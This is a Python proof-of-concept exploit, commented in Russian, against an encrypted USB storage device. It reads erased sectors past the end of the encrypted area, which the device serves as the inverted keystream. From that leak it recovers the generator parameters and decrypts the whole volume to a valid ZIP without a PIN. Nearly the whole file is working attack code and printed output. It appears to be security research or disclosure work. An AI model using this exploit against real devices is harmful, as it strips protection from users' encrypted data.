#!/usr/bin/env python3
"""
PoC для вектора attack5 — оракул гаммы из секторов за пределами шифрованного хранилища.

Механика (см. README.md): msc_read10_decrypt_storage (0x10000354) обслуживает
0x800 секторов (1 МиБ), а шифрованное хранилище занимает только 0xB0000 (704 КиБ).
Флеш за его концом стёрт (0xFF), и устройство «расшифровывает» его на лету:
    served(L) = 0xFF XOR keystream(L) = ~keystream(L)
— то есть любой смонтировавший диск хост легально получает чистую гамму.

Модель утечки проверяется по дампу с вшитыми константами (эмуляция того, что
отдаёт устройство: served = flash XOR keystream). Восстановление генератора из
собранной гаммы (шаг 3 вектора) реализовано отдельно, движком из attack3, и НЕ
использует вшитые константы — оно решает (A, seed, B, W) из одной лишь утечки и
проверяется расшифровкой хранилища до валидного по CRC ZIP.

Usage:
    python3 keystream_leak_demo.py backup_full.bin
"""
import os
import sys
import math
from collections import Counter

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "attack3"))
import recover_keystream as R  # noqa: E402  (shared generator math, single source)

STORAGE_OFF = 0x100000          # 0x10100000 - 0x10000000 (XIP base)
STORAGE_LEN = 0xB0000           # 704 KiB шифрованной области
SECTOR      = 512
DISK_SECTORS = 0x800            # что объявлено в MSC (1 МиБ) — граница из 0x10000354
DISK_BYTES  = DISK_SECTORS * SECTOR

MUL_LBA = 0x38C9CDA0
SEED    = 0x9E37A9EA
INC_BLK = 0x41C64E6D
LANES = [0x61C8864F, 0x00000000, 0x9E3779B1, 0x3C6EF362,
         0xDAA66D13, 0x78DDE6C4, 0x17156075, 0xB54CDA26,
         0x538453D7, 0xF1BBCD88, 0x8FF34739, 0x2E2AC0EA,
         0xCC623A9B, 0x6A99B44C, 0x08D12DFD, 0xA708A7AE]


def ks_block(lba, j):
    s = (lba * MUL_LBA + SEED + j * INC_BLK) & 0xFFFFFFFF
    return bytes(((s + c) & 0xFFFFFFFF) >> 24 for c in LANES)


def ks_sector(lba):
    return b"".join(ks_block(lba, j) for j in range(SECTOR // 16))


def entropy(buf):
    cnt = Counter(buf)
    n = len(buf)
    return -sum((v / n) * math.log2(v / n) for v in cnt.values())


def recover_generator_from_leak(ks_by_lba, storage_ct):
    """Recover (A, seed, B, W) from the slack-oracle keystream alone.

    ks_by_lba maps a leaked LBA to its 512 keystream bytes (ks = 0xFF ^ served,
    since the tail flash is erased). No firmware constant is read: B and W are
    found in attack3's public-constant dictionary, A = 32*B, and seed by interval
    intersection on Z/2**32 over the leaked bytes. The unique (A, seed, B, W) is
    the one that decrypts the storage volume to a CRC-valid ZIP. Returns it or None.
    """
    sample = sorted(ks_by_lba)[:4]        # a few leaked sectors already pin seed
    for B in R.FAMOUS:
        A = (32 * B) & R.MASK
        for W in R.FAMOUS:
            cons = []
            for lba in sample:
                ks = ks_by_lba[lba]
                for o in range(R.SEC):
                    off = (lba * A + R.lane_offset(o, B, W)) & R.MASK
                    cons.append((ks[o], off))
            seeds = R._solve(cons)
            if not seeds:
                continue
            for seed in seeds:
                pt = R.decrypt_all(storage_ct, A, seed, B, W)
                if R.strict_bootsector(pt[:R.SEC]) and R.volume_has_valid_zip(pt):
                    return (A, seed, B, W)
    return None


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 1
    data = open(argv[1], "rb").read()

    print("=== attack5: оракул гаммы за пределами хранилища ===")
    print(f"диск (MSC)      : {DISK_SECTORS} секторов = {DISK_BYTES // 1024} КиБ "
          f"(граница param_2 < 0x800 в 0x10000354)")
    print(f"хранилище       : {STORAGE_LEN // 1024} КиБ = {STORAGE_LEN // SECTOR} секторов (LBA 0..{STORAGE_LEN // SECTOR - 1})")

    # 1) точная граница, с которой флеш стёрт
    first_ff = None
    for lba in range(DISK_SECTORS):
        off = STORAGE_OFF + lba * SECTOR
        if all(b == 0xFF for b in data[off:off + SECTOR]):
            first_ff = lba
            break
    if first_ff is None:
        print("[!] нет полностью стёртых секторов — дамп не похож на этот образ")
        return 2
    slack_sectors = DISK_SECTORS - first_ff
    print(f"\n[1] первый полностью стёртый сектор флеша: LBA {first_ff} (0x{first_ff:x})")
    print(f"    LBA {first_ff}..{DISK_SECTORS - 1} лежат ВНЕ шифрованной области "
          f"({slack_sectors} секторов = {slack_sectors * SECTOR // 1024} КиБ утечки)")

    # 2) что реально получает хост: сектор до границы, после и особый случай
    print("\n[2] сравнение обслуживаемых данных (flash XOR гамма):")
    for lba in (first_ff - 1, first_ff, first_ff + 100, DISK_SECTORS - 1):
        off = STORAGE_OFF + lba * SECTOR
        flash = data[off:off + SECTOR]
        served = bytes(c ^ k for c, k in zip(flash, ks_sector(lba)))
        erased = all(b == 0xFF for b in flash)
        tag = "вне хранилища -> УТЕЧКА (~гамма)" if erased else \
              ("вне хранилища, но не стёрт: зашифрованные нули, в оракул не годится" if lba >= first_ff
               else "внутри хранилища")
        print(f"  LBA {lba:4d} (0x{lba:03x}): {tag}")
        print(f"    flash : {flash[:16].hex(' ')}")
        print(f"    served: {served[:16].hex(' ')}  entropy={entropy(served):.3f} бит/байт")

    # 3) доказательство модели: во всех стёртых секторах утечки served == ~ks
    print("\n[3] проверка модели на всей области утечки:")
    ok = True
    leaked = 0
    exceptions = []
    for lba in range(first_ff, DISK_SECTORS):
        off = STORAGE_OFF + lba * SECTOR
        flash = data[off:off + SECTOR]
        served = bytes(c ^ k for c, k in zip(flash, ks_sector(lba)))
        complement = bytes(0xFF ^ k for k in ks_sector(lba))
        if all(b == 0xFF for b in flash):
            if served != complement or all(b == 0xFF for b in served):
                print(f"    FAIL на LBA {lba}")
                ok = False
                break
            leaked += 1
        else:
            exceptions.append(lba)
    if ok:
        print(f"    OK — {leaked} стёртых секторов отдаются ровно как ~гамма")
        if exceptions:
            print(f"    исключения ({len(exceptions)} шт: {exceptions[:4]}...) — не стёрты, а содержат"
                  f" зашифрованные нули (артефакт записи образа): served там = 0x00, в оракул не годятся")
    total = leaked * SECTOR
    print(f"    суммарно хост собирает ~{total} байт чистой гаммы одним последовательным чтением")

    # 4) шаг 3 вектора: восстановить генератор ИЗ утечки, без вшитых констант,
    #    и доказать расшифровкой хранилища до валидного по CRC ZIP
    print("\n[4] восстановление генератора из собранной гаммы (движок attack3, без констант прошивки):")
    ks_by_lba = {}
    for lba in range(first_ff, DISK_SECTORS):
        off = STORAGE_OFF + lba * SECTOR
        flash = data[off:off + SECTOR]
        if all(b == 0xFF for b in flash):
            served = bytes(c ^ k for c, k in zip(flash, ks_sector(lba)))  # что отдаёт устройство
            ks_by_lba[lba] = bytes(0xFF ^ s for s in served)              # хвост стёрт => ks = 0xFF ^ served
    storage_ct = data[STORAGE_OFF:STORAGE_OFF + STORAGE_LEN]
    res = recover_generator_from_leak(ks_by_lba, storage_ct)
    if res is None:
        print("    FAIL — генератор не восстановлен из утечки")
        return 1
    A, seed, B, W = res
    pt = R.decrypt_all(storage_ct, A, seed, B, W)
    zf_ok = R.volume_has_valid_zip(pt)
    print(f"    B    = 0x{B:08X}  ({'glibc rand()' if B == INC_BLK else 'словарь'})")
    print(f"    W    = 0x{W:08X}  ({'golden-ratio Кнута' if W == 0x9E3779B1 else 'словарь'})")
    print(f"    A    = 0x{A:08X}  (= 32*B, производный)")
    print(f"    seed = 0x{seed:08X}  ({'точно совпал с прошивкой' if seed == SEED else 'член класса эквивалентности'})")
    print(f"    сектор 0 -> {pt[:11].hex(' ')} ...  OEM={bytes(pt[3:11])!r}  boot sig={pt[510:512].hex(' ')}")
    print(f"    валидный FAT12 boot: {R.strict_bootsector(pt[:SECTOR])};  CRC-валидный ZIP: {zf_ok}")
    if not (R.strict_bootsector(pt[:SECTOR]) and zf_ok):
        print("    FAIL — восстановленная гамма не расшифровала хранилище")
        return 1
    print("    OK — оракул за границей вскрывает весь том без дампа прошивки, без PIN, без реверса")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))